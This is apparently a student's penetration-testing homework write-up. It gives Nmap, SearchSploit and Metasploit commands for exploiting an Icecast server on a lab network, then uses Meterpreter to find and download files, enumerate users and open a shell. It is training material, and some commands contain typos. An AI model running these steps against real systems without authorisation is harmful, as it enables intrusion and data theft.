
# Rob Myers: Week 17 Homework: Penetration Testing 2

This week I was tasked with performing an internal penetration test on GoodCorp’s server. GoodCorp is an source streaming media server.

For a full review of the findings here is a copy of the after action report: (Icecast Report)

### [Icecast Report](Report.pdf)

Below is commands and exploits used to demonstrate vulnerabilities on the Icecast Server: 

## Instructions

You've been provided full access to the network and are getting ping responses from the CEO’s workstation.


1. Perform a service and version scan using Nmap to determine which services are up and running:

    * Run the Nmap command that performs a service and version scan against the target.

        ### Answer: **nmap -sS -sV -O -Pn 192.168.0.20**

   ### [nmap-Pictures](IMAGE/OS.md) 
        

2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:

    * Run the SearchSploit commands to show available Icecast exploits.

       ### Answer: **searchsploit Icecast**

    ### [Searchsploit Pictures](IMAGE/search.md)


3. Now that we know which exploits are available to us, let's start Metasploit:

    * Run the command that starts Metasploit:

        ### Answer: **msfconsole**

    ### [Starting metasploit Pictures](IMAGE/meta1.md) 

4. Search for the Icecast module and load it for use.

    * Run the command to search for the Icecast module:

        ### Answer: **search Icecast**

     ### [Search Icecast Pictures](IMAGE/meta.md) 

    * Run the command to use the Icecast module:

        ### Answer: **use 0** 

    ### [Use the Icecast Module Picture](IMAGE/meta2.md)     

5. Set the RHOST to the target machine.

    * Run the command that sets the RHOST:

       ### Answer: **set RHOSTS 192.168.0.20** 

     ### [Set the RHOSTS Picture](IMAGE/meta3.md)  

6. Run the Icecast exploit.

    * Run the command that runs the Icecast exploit.

    ### Answer: **RUN**

    ### [Running the Exploit Picture](IMAGE/meta4.md) 

    * Run the command that performs a search for the secretfile.txt on the target.

    ### Answer: **search -f * secretfile * .txt**

    ### [Searching for Secretfile.txt Picture](IMAGE/meta5.md)  

7. You should now have a Meterpreter session open.

    * Run the command to perform a search for the recipe.txt on the target:

    ### Answer: **search -f * recipe * .txt**

    ### [Searching for recipe Picture](IMAGE/meta6.md) 

    * Run the command that exfiltrates the recipe*.txt file:

    ### Answer: **download c/Users/IEUsers/Documents/Drinks.recipe.txt**


    ### [Exfiltrates command for recipe.txt](IMAGE/meta7.md) 

    ### [Common Meterpreter Commands](IMAGE/meta8.md) 


8. You can also use Meterpreter's local exploit suggester to find possible exploits.

    * Run the command to use Meterpreters's local exploit suggester 

    ### [Meterpreter Explit Suggester](IMAGE/meta9.md)  

    ### Answer: **run post/multi/recon/local_explit_suggester

Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

Bonus

A. Run a Meterpreter post script that enumerates all logged on users.

### Answer: **run post/windows/gather/enum_logged_on_users** 

### [View ALL logged on Users](IMAGE/meta10.md)  


B. Open a Meterpreter shell.

### Answer: **shell** 

### [Document the Shell Command](IMAGE/meta11.md) 

C. Run the command that displays the target's computer system information:

### Answer: **sysinfo** 

### [sysinfo information](IMAGE/meta11.md)










    